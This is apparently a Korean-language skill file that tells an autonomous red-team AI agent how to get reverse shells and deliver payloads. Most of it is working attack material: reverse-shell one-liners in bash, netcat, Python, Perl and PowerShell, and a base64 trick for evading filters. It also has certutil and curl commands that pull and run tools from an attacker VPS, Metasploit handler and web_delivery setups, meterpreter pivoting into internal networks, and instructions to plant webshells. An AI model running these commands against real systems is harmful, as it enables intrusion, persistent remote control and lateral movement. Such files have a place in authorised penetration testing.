---
name: shell-handler
description: 리버스 셸과 페이로드 전달: VPS 에서 MSF/nc/socat 리스너로 셸을 받거나, 대상이 페이로드를 직접 당겨오게 한다
whenToUse: RCE/명령 실행의 역접속이 필요할 때, 후속 페이로드를 전달할 때, 일회성 명령 실행을 대화형 세션으로 바꿀 때
role: exploit
enabled: true
---

# 리버스 셸과 페이로드 전달(역접속 세션 확보)

> **먼저 VPS 설정을 로드한다**: 이 스킬의 모든 `$REDTEAM_VPS_HOST` / `$VPS_USER` 는 로컬 설정에서 오고,
> 최초에는 `bash $DSH_HOME/redteam/setup.sh` 가 `$DSH_HOME/.env` 에 기록한다. 명령마다 앞에서 한 번 source 한다:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> 설정한 적이 없으면 `setup.sh` 를 한 번 실행한다(스킬 `redteam-setup`). SSH 연결성과 페이로드 서비스도 함께 검증된다.

**명령 실행 ≠ 세션**. 일회성 `?cmd=whoami` 는 취약점이 있다는 것만 증명할 뿐 지속적으로 조작할 수 없다. 이 스킬은 "명령을 실행할 수 있다" 를
**안정적이고 대화형이며 재사용 가능한** 역접속 세션으로 바꾸고, 후속 페이로드(셸, 터널, 스캐너)를 전달하는 일을 담당한다.

## 로컬 인프라

| 항목 | 값 |
| --- | --- |
| VPS | `$REDTEAM_VPS_HOST`(SSH 포트 22, 개인 키 `$DSH_HOME/redteam/toolkit/vps/id_rsa`) |
| 페이로드 배포 | `http://$REDTEAM_VPS_HOST:9100/`(fscan/gogo/Behinder 셸/Godzilla 셸 동기화 완료) |
| 리스닝 포트 구간 | `9000-9999` |
| 세션 관리 | `tmux`(리스너는 반드시 tmux 안에서 돌린다. 아니면 연결이 끊길 때 잃는다) |
| 로컬 도구 | `nc`, `socat`, `msfconsole` 6.5.3(`exploit/multi/handler`, `exploit/multi/script/web_delivery` 존재 확인 완료) |

함께 쓰는 스킬: `vps-reverse-shell`(VPS 로그인과 리스닝의 구체적 조작), `webshell-toolkit`(Behinder/Godzilla 셸 착지).

## 1. 선택: 언제 무엇을 쓰는가

| 상황 | 사용법 |
| --- | --- |
| **임시 검증**(명령 하나만 돌려 회신을 보고 싶다) | `nc -lvnp <port>` + 대상 측 bash/python 리버스, 충분하면 그것으로 끝낸다 |
| **장기 조작 / 파일 전송 / 터널 개설**(**주력**) | **MSF `multi/handler`**(자동 재접속, meterpreter 업그레이드, socks 개설 가능) |
| **대상이 HTTP(S) 만 나갈 수 있다** | `web_delivery`(MSF 가 한 줄 명령을 생성하고 대상이 payload 를 직접 당겨온다) |
| **Windows 대상, 안정성이 필요하다** | MSF handler + `shell_to_meterpreter` 업그레이드 |
| **내부망 트래픽을 프록시로 끌어와야 한다** | 셸을 얻은 뒤 셸로 프록시하지 **않고**, WebShell 을 착지시켜 `suo5-tunnel` 로 간다(스킬 참조) |

## 2. MSF handler(권장 주력)

```bash
# 1) VPS 의 tmux 안에서 리스닝 시작(로컬/VPS 모두 가능, 역접속 방향을 본다)
tmux new -s handler
msfconsole -q

msf6 > use exploit/multi/handler
msf6 > set payload linux/x64/meterpreter/reverse_tcp   # Windows: windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9001
msf6 > set ExitOnSession false      # 핵심: 세션이 끊겨도 종료하지 않고 재접속을 계속 기다린다
msf6 > exploit -j                    # 백그라운드 리스닝
```

**리스닝 전에 포트가 비어 있는지 확인한다**: `ss -lntp | grep 9001`; VPS 보안 그룹에서 해당 포트를 허용해야 한다.

일회성 전달 + 세션 수신의 전체 흐름 예시:
```bash
# 대상 측(명령 실행 지점이 있다고 가정)
bash -c 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1'
# bash 가 없으면 다른 것을 쓴다(아래 표 참조)
```

## 3. 언어별 리버스 한 줄(대상 환경에 맞춰 선택)

```bash
# Linux - bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
# Linux - bash 없음(sh + nc)
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <IP> <PORT> > /tmp/f
# Linux - python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",<PORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Linux - perl
perl -e 'use Socket;$i="<IP>";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
# Windows - powershell(이스케이프와 실행 정책에 주의)
powershell -nop -w hidden -c "$c=New-Object Net.Sockets.TCPClient('<IP>',<PORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length)}"
# Windows - certutil 로 페이로드를 내려받아 실행
certutil -urlcache -split -f http://$REDTEAM_VPS_HOST:9100/fscan.exe C:\Windows\Temp\f.exe && C:\Windows\Temp\f.exe -h 10.0.0.0/24
# Linux - curl/wget 로 페이로드 다운로드
curl -s http://$REDTEAM_VPS_HOST:9100/gogo -o /tmp/gogo && chmod +x /tmp/gogo && /tmp/gogo -i 10.0.0.0/24 -m ss
```

**인코딩 우회**: 명령에 공백/따옴표가 걸릴 때는 base64 로 인코딩한 뒤 푼다:
```bash
# 생성(로컬)
echo -n 'bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1' | base64 -w0
# 대상에서 실행
echo <BASE64> | base64 -d | bash
```

## 4. MSF web_delivery(HTTP 만 나갈 수 있을 때)

```bash
msf6 > use exploit/multi/script/web_delivery
msf6 > set target 7              # 7 = Linux Python(먼저 show targets 로 목록을 본다)
msf6 > set payload python/meterpreter/reverse_tcp
msf6 > set LHOST $REDTEAM_VPS_HOST
msf6 > set LPORT 9002
msf6 > exploit -j
# MSF 가 한 줄 명령을 출력한다(python -c "import urllib.request;..." 형태),
# 그것을 대상의 명령 실행 지점에 넣는다 → 대상이 payload 를 직접 당겨온다 → 세션 성립
```

## 5. 업그레이드와 유지

```bash
# 셸을 meterpreter 로 업그레이드(socks 개설, 파일 전송, 권한 상승 가능)
msf6 > sessions -l
msf6 > sessions -u <id>            # 또는 post/multi/manage/shell_to_meterpreter 사용

# meterpreter 로 내부망 socks 프록시 개설
meterpreter > run autoroute -s 10.0.0.0/24
meterpreter > background
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 5
msf6 > exploit -j
# 이후 proxychains 를 127.0.0.1:1080 으로 향하게 하면 내부망에 들어갈 수 있다
```
> ⚠️ 득점 기준: **자체 VPS 에서만 연 프록시는 터널로 인정되지 않는다**. meterpreter autoroute 로 도달한 내부망 대상은
> `entry_kind=target-agent`(대상의 장악된 프로세스 경유 전달)에 해당하며, `redteam_tunnel_add` 등록 시 대상 측 끝단을 반드시 분명히 적는다.

## 6. 규율(반드시 지킨다)

1. **리스너는 반드시 tmux 안에서 실행한다**: SSH 가 끊기면 리스너가 죽고 세션을 잃는다. `tmux new -s handler` / `tmux a -t handler`.
2. **포트 점유를 먼저 확인**하고 VPS 보안 그룹에서 허용한다; 한 머신에서 동시에 리스너를 너무 많이 열지 않는다(9000-9999 구간을 순서대로 쓴다).
3. **리버스 셸은 "대상이 먼저 외부로 접속"하는 방식**이다: 대상의 외부 통신이 제한되면 먼저 HTTP(S) 외부 통신(80/443/8080)을 시도하고,
   전혀 나갈 수 없으면 WebShell + 터널(`suo5-tunnel`)로만 간다.
4. **서비스를 재시작시키는 페이로드를 운영 시스템에서 돌리지 않는다**; 권한 상승/커널 취약점 계열 작업은 재시작 위험을 먼저 평가한다.
5. **세션을 등록한다**: 셸을 얻으면 즉시 `redteam_session_check` 로 이후 사용 가능 상태를 남긴다; 터널 등록은 `redteam_tunnel_add` 참조.

## 7. 출력과 적재(강제)

1. **역접속 세션을 얻으면 즉시 득점**: `redteam_score_hit`(`server-host` / `server-host`), `evidence` 에 "자산|셸 종류와 권한" 을 쓴다(예: `10.0.0.5|root shell(uid=0)`).
2. **세션 적재**: `redteam_access_add`(`method=reverse-shell`, `target`, `user`, `privilege`, 리스닝 주소와 포트를 분명히 기록).
3. **터널 적재**(그것을 통해 내부망에 들어갔다면): `redteam_tunnel_add`, `entry_kind` 는 대상 측 끝단을 분명히 적는다
   (`target-outbound`=대상이 리버스하거나 대상이 frp 클라이언트를 돌림, `target-http`=대상 WebShell 경유 suo5, `target-agent`=대상의 장악된 프로세스 경유 전달),
   그다음 `redteam_session_check` 로 연결성을 실측한다.
4. 핵심 동작마다 `redteam_chain_add`: `stage_code=internet`(인터넷 측 권한 획득) / `boundary`(터널 구축) / `internal`,
   `tool` 에 **실제 명령 원문**(전체 리버스 명령 또는 MSF 설정 포함), `result` 에 회신 요약(예: `uid=0(root) gid=0(root)`).
5. **사용자가 재사용할 수 있는 진입점을 인계한다**: **Behinder/Godzilla 셸**을 우선 착지시킨다(스킬 `webshell-toolkit`) —— 사용자가 콘솔에서 직접 연결해 조작할 수 있다;
   임시 리버스 세션은 "일회성 세션이며 납품 진입점이 아니다" 라고 설명한다.
